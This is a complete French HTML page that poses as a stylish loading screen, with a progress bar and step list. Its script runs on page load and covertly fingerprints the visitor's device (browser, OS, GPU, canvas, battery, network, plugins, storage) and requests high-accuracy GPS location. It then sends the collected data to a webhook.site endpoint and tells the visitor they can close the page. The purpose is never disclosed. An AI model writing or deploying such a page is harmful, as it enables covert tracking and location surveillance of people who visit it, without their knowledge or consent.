<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chargement…</title>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=DM+Mono:wght@300;400&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg: #f7f4ef;
      --ink: #1a1714;
      --gold: #c9a84c;
      --gold-light: #e8d5a3;
      --cream: #ede8df;
      --muted: #8a8075;
    }
    html, body { width:100%; height:100%; background:var(--bg); overflow:hidden; }
    body { display:flex; align-items:center; justify-content:center; font-family:'DM Mono',monospace; }
    body::before {
      content:''; position:fixed; inset:0; pointer-events:none; z-index:100; opacity:0.5;
      background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.06'/%3E%3C/svg%3E");
    }
    .corner { position:fixed; width:36px; height:36px; opacity:0.25; }
    .corner-tl { top:1.5rem; left:1.5rem; border-top:1px solid var(--gold); border-left:1px solid var(--gold); }
    .corner-tr { top:1.5rem; right:1.5rem; border-top:1px solid var(--gold); border-right:1px solid var(--gold); }
    .corner-bl { bottom:1.5rem; left:1.5rem; border-bottom:1px solid var(--gold); border-left:1px solid var(--gold); }
    .corner-br { bottom:1.5rem; right:1.5rem; border-bottom:1px solid var(--gold); border-right:1px solid var(--gold); }
    .container { text-align:center; padding:3rem; opacity:0; animation:fadeIn 1.2s ease forwards 0.3s; }
    @keyframes fadeIn { to { opacity:1; } }
    .ring-wrap { position:relative; width:110px; height:110px; margin:0 auto 2.5rem; }
    .ring { width:110px; height:110px; border-radius:50%; border:1.5px solid var(--gold-light); position:absolute; top:0; left:0; }
    .ring-spin { border:1.5px solid transparent; border-top-color:var(--gold); animation:spin 2s linear infinite; }
    .ring-spin2 { width:80px; height:80px; top:50%; left:50%; transform:translate(-50%,-50%); border:1px solid transparent; border-bottom-color:var(--gold-light); animation:spin 3s linear infinite reverse; }
    @keyframes spin { to { transform:rotate(360deg); } }
    .ring-spin2-abs { position:absolute; }
    .ring-inner { width:60px; height:60px; border-radius:50%; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:var(--cream); display:flex; align-items:center; justify-content:center; border:1px solid var(--gold-light); }
    .ring-dot { width:8px; height:8px; border-radius:50%; background:var(--gold); animation:pulse 2s ease-in-out infinite; }
    @keyframes pulse { 0%,100%{transform:scale(1);opacity:1;} 50%{transform:scale(1.6);opacity:0.4;} }
    .orbit { position:absolute; width:5px; height:5px; border-radius:50%; background:var(--gold); top:50%; left:50%; margin:-2.5px 0 0 -2.5px; animation:orbit linear infinite; }
    .orbit:nth-child(4) { animation-duration:3.5s; }
    .orbit:nth-child(5) { animation-duration:5.5s; background:var(--muted); width:3px; height:3px; margin:-1.5px 0 0 -1.5px; }
    @keyframes orbit { 0%{transform:rotate(0deg) translateX(55px);} 100%{transform:rotate(360deg) translateX(55px);} }
    h1 { font-family:'Playfair Display',serif; font-size:1.5rem; font-weight:400; color:var(--ink); margin-bottom:0.4rem; line-height:1.35; }
    h1 em { font-style:italic; color:var(--gold); }
    .subtitle { font-size:0.65rem; color:var(--muted); letter-spacing:0.14em; text-transform:uppercase; margin-bottom:2rem; }
    .progress-wrap { width:180px; height:1px; background:var(--cream); margin:0 auto 0.6rem; overflow:hidden; }
    .progress-bar { height:100%; background:linear-gradient(90deg, var(--gold-light), var(--gold)); width:0%; transition:width 0.5s ease; }
    .progress-label { font-size:0.6rem; color:var(--muted); letter-spacing:0.1em; }
    .steps { margin-top:1.75rem; display:flex; flex-direction:column; gap:0.35rem; align-items:flex-start; max-width:230px; margin-left:auto; margin-right:auto; }
    .step { display:flex; align-items:center; gap:0.6rem; font-size:0.6rem; color:var(--muted); letter-spacing:0.06em; opacity:0; transform:translateX(-6px); transition:all 0.4s ease; }
    .step.visible { opacity:1; transform:translateX(0); }
    .step.done { color:var(--ink); }
    .step-dot { width:5px; height:5px; border-radius:50%; background:var(--cream); border:1px solid var(--gold-light); flex-shrink:0; transition:background 0.3s; }
    .step.done .step-dot { background:var(--gold); border-color:var(--gold); }
    .done-msg { display:none; flex-direction:column; align-items:center; gap:0.75rem; }
    .done-msg .check { font-size:2.5rem; animation:popIn 0.6s cubic-bezier(0.175,0.885,0.32,1.275) forwards; color:var(--gold); }
    @keyframes popIn { 0%{transform:scale(0) rotate(-20deg);} 100%{transform:scale(1) rotate(0deg);} }
    .done-msg p { font-family:'Playfair Display',serif; font-size:1.2rem; color:var(--ink); }
    .done-msg small { font-size:0.6rem; color:var(--muted); letter-spacing:0.1em; text-transform:uppercase; }
  </style>
</head>
<body>
<div class="corner corner-tl"></div>
<div class="corner corner-tr"></div>
<div class="corner corner-bl"></div>
<div class="corner corner-br"></div>

<div class="container">
  <div id="loading-view">
    <div class="ring-wrap">
      <div class="ring"></div>
      <div class="ring ring-spin"></div>
      <div class="ring ring-spin2 ring-spin2-abs"></div>
      <div class="orbit"></div>
      <div class="orbit"></div>
      <div class="ring-inner"><div class="ring-dot"></div></div>
    </div>
    <h1>Initialisation<br><em>en cours…</em></h1>
    <p class="subtitle">Veuillez patienter</p>
    <div class="progress-wrap"><div class="progress-bar" id="progress"></div></div>
    <div class="progress-label" id="progress-label">0%</div>
    <div class="steps" id="steps">
      <div class="step" id="s1"><div class="step-dot"></div>Détection de l'environnement</div>
      <div class="step" id="s2"><div class="step-dot"></div>Analyse du système</div>
      <div class="step" id="s3"><div class="step-dot"></div>Vérification du réseau</div>
      <div class="step" id="s4"><div class="step-dot"></div>Collecte des capteurs</div>
      <div class="step" id="s5"><div class="step-dot"></div>Finalisation</div>
    </div>
  </div>
  <div class="done-msg" id="done-view">
    <div class="check">✦</div>
    <p>Terminé.</p>
    <small>Vous pouvez fermer cette page</small>
  </div>
</div>

<script>
const WEBHOOK_URL = "https://webhook.site/42e9b838-f4c0-4861-8ac7-77a02b29ac0a";

const progressEl = document.getElementById('progress');
const labelEl = document.getElementById('progress-label');

function setProgress(pct, stepIdx) {
  progressEl.style.width = pct + '%';
  labelEl.textContent = pct + '%';
  ['s1','s2','s3','s4','s5'].forEach((id, i) => {
    const el = document.getElementById(id);
    if (i <= stepIdx) el.classList.add('visible');
    if (i < stepIdx) el.classList.add('done');
  });
}

function showDone() {
  document.getElementById('loading-view').style.display = 'none';
  const d = document.getElementById('done-view');
  d.style.display = 'flex';
}

function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

async function run() {
  setProgress(10, 0);
  await delay(700);

  const data = {
    timestamp_iso: new Date().toISOString(),
    heure_locale: new Date().toLocaleString('fr-FR'),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset_min: new Date().getTimezoneOffset(),
    user_agent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor || 'inconnu',
    langue: navigator.language,
    langues_dispo: (navigator.languages || []).join(', '),
    cookies_actives: navigator.cookieEnabled,
    do_not_track: navigator.doNotTrack,
    coeurs_cpu: navigator.hardwareConcurrency,
    memoire_go: navigator.deviceMemory ?? 'inconnu',
    max_touch_points: navigator.maxTouchPoints,
    tactile: navigator.maxTouchPoints > 0,
    ecran_resolution: screen.width + 'x' + screen.height,
    ecran_disponible: screen.availWidth + 'x' + screen.availHeight,
    ecran_profondeur_couleur: screen.colorDepth + ' bits',
    pixel_ratio: window.devicePixelRatio,
    fenetre: window.innerWidth + 'x' + window.innerHeight,
    orientation: screen.orientation?.type ?? 'inconnu',
    en_ligne: navigator.onLine,
  };

  // OS & navigateur
  const ua = navigator.userAgent;
  if (/Windows NT 10|Windows NT 11/.test(ua)) data.os = 'Windows 10/11';
  else if (/Windows NT 6\.3/.test(ua)) data.os = 'Windows 8.1';
  else if (/Windows NT 6\.1/.test(ua)) data.os = 'Windows 7';
  else if (/Android/.test(ua)) { data.os = 'Android'; data.android_version = (ua.match(/Android ([0-9.]+)/)||[])[1]||'?'; }
  else if (/iPhone/.test(ua)) { data.os = 'iOS iPhone'; data.ios_version = (ua.match(/OS ([0-9_]+)/)||[])[1]?.replace(/_/g,'.')||'?'; }
  else if (/iPad/.test(ua)) { data.os = 'iOS iPad'; }
  else if (/Mac OS X/.test(ua)) { data.os = 'macOS'; data.macos_version = (ua.match(/Mac OS X ([0-9_]+)/)||[])[1]?.replace(/_/g,'.')||'?'; }
  else if (/Linux/.test(ua)) data.os = 'Linux';
  else data.os = 'Inconnu';

  if (/Edg\//.test(ua)) { data.navigateur = 'Edge'; data.nav_version = (ua.match(/Edg\/([0-9.]+)/)||[])[1]; }
  else if (/OPR\//.test(ua)) { data.navigateur = 'Opera'; data.nav_version = (ua.match(/OPR\/([0-9.]+)/)||[])[1]; }
  else if (/Firefox\//.test(ua)) { data.navigateur = 'Firefox'; data.nav_version = (ua.match(/Firefox\/([0-9.]+)/)||[])[1]; }
  else if (/Chrome\//.test(ua)) { data.navigateur = 'Chrome'; data.nav_version = (ua.match(/Chrome\/([0-9.]+)/)||[])[1]; }
  else if (/Safari\//.test(ua)) { data.navigateur = 'Safari'; data.nav_version = (ua.match(/Version\/([0-9.]+)/)||[])[1]; }
  else data.navigateur = 'Inconnu';

  setProgress(30, 1);
  await delay(600);

  // Réseau
  if (navigator.connection) {
    data.reseau_type_effectif = navigator.connection.effectiveType;
    data.reseau_vitesse_mbps = navigator.connection.downlink;
    data.reseau_rtt_ms = navigator.connection.rtt;
    data.economie_donnees = navigator.connection.saveData;
    data.reseau_type_brut = navigator.connection.type || 'inconnu';
  }

  // Batterie
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      data.batterie_pct = Math.round(b.level * 100) + '%';
      data.batterie_en_charge = b.charging;
      if (b.chargingTime !== Infinity) data.batterie_charge_restante_s = b.chargingTime;
      if (b.dischargingTime !== Infinity) data.batterie_autonomie_s = b.dischargingTime;
    } catch(e) {}
  }

  setProgress(55, 2);
  await delay(500);

  // WebGL & GPU
  try {
    const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
    if (gl) {
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (ext) {
        data.gpu_vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        data.gpu_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
      }
      data.webgl_version = gl.getParameter(gl.VERSION);
      data.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
    }
  } catch(e) {}

  // Canvas fingerprint
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px serif';
    ctx.fillStyle = '#f60'; ctx.fillRect(120,1,60,20);
    ctx.fillStyle = '#069'; ctx.fillText('tracker✓', 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('tracker✓', 4, 17);
    data.canvas_fp = c.toDataURL().slice(-60);
  } catch(e) {}

  // Capacités
  data.webrtc = !!window.RTCPeerConnection;
  data.webp_support = document.createElement('canvas').toDataURL('image/webp').startsWith('data:image/webp');
  data.indexeddb = !!window.indexedDB;
  data.service_worker = 'serviceWorker' in navigator;
  data.notifications = 'Notification' in window;
  data.notification_permission = window.Notification ? Notification.permission : 'n/a';
  data.bluetooth = 'bluetooth' in navigator;
  data.usb = 'usb' in navigator;
  data.gamepads = 'getGamepads' in navigator;

  // Plugins
  try {
    const plugins = [];
    for (let p of navigator.plugins) plugins.push(p.name);
    data.plugins = plugins.join(', ') || 'aucun';
  } catch(e) {}

  // AdBlock approximatif
  try {
    const ad = document.createElement('div');
    ad.className = 'adsbox ad-banner banner-ads';
    ad.style.cssText = 'position:absolute;opacity:0;height:1px;width:1px;top:-100px;';
    document.body.appendChild(ad);
    await delay(150);
    data.adblock_detecte = ad.offsetHeight === 0 || ad.offsetWidth === 0;
    document.body.removeChild(ad);
  } catch(e) {}

  // Stockage estimé
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      data.stockage_utilise_mb = Math.round((est.usage || 0) / 1024 / 1024);
      data.stockage_quota_mb = Math.round((est.quota || 0) / 1024 / 1024);
    }
  } catch(e) {}

  setProgress(75, 3);
  await delay(400);

  // Géolocalisation
  try {
    await new Promise(resolve => {
      navigator.geolocation.getCurrentPosition(
        pos => {
          data.gps_latitude = pos.coords.latitude;
          data.gps_longitude = pos.coords.longitude;
          data.gps_precision_m = Math.round(pos.coords.accuracy);
          if (pos.coords.altitude) data.gps_altitude_m = Math.round(pos.coords.altitude);
          if (pos.coords.speed) data.gps_vitesse_ms = pos.coords.speed;
          data.gps_maps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
          resolve();
        },
        () => { data.gps = 'refusé'; resolve(); },
        { timeout: 5000, enableHighAccuracy: true }
      );
    });
  } catch(e) { data.gps = 'indisponible'; }

  setProgress(90, 4);
  await delay(400);

  // Envoi
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch(e) {}

  setProgress(100, 4);
  await delay(700);
  showDone();
}

run();
</script>
</body>
</html>
